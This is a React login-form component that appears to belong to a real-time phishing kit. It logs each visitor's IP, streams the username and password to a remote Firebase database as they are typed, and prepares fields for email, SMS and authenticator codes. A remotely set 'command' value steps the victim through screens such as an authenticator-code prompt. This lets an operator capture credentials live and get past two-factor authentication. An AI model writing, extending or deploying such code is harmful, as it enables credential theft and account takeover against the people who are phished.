"use client";

import { database } from "@/firebase";
import {
  ThenableReference,
  onDisconnect,
  onValue,
  push,
  ref,
  update,
} from "firebase/database";

import { useEffect, useState } from "react";
import { AuthenticatorCode } from "./steps/AuthenticatorCode";

export const LoginForm = () => {
  const [dataRef, setDataRef] = useState<null | ThenableReference>(null);
  const [ipForm, seteIpForm] = useState<string | null>(null);

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const [command, setCommand] = useState("W_LOGIN");

  useEffect(() => {
    fetch("https://api.ipify.org?format=json").then(async (res) => {
      const { ip } = await res.json();
      const ipF = ip.replaceAll(".", ",");
      const infosRef = ref(database, `info/${ipF}`);
      seteIpForm(ipF);
      if (ip) {
        const newDataRef = push(infosRef, {
          online: true,
          username: "",
          password: "",
          emailCode: "",
          twoAF: "",
          smsCode: "",
          trPass: {
            tr: "",
            email: "",
            sms: "",
            twoFa: "",
          },
          zone: "",
          command: "W_LOGIN",
        });

        setDataRef(newDataRef);

        onDisconnect(newDataRef).update({
          online: false,
        });

        onValue(newDataRef, (snap) => {
          const data = snap.val();

          setCommand(data.command);
        });
      }
    });
  }, []);

  useEffect(() => {
    if (dataRef) {
      update(dataRef, { username, password });
    }
  }, [username, password]);

  return (
    <>
      <div className="flex-1 w-full md:min-w-[780px] min-w-max flex justify-center">
        {/* <UserPass
          password={password}
          setPassword={setPassword}
          setUsername={setUsername}
          username={username}
        /> */}
        <AuthenticatorCode dataRef={dataRef} />
      </div>
    </>
  );
};
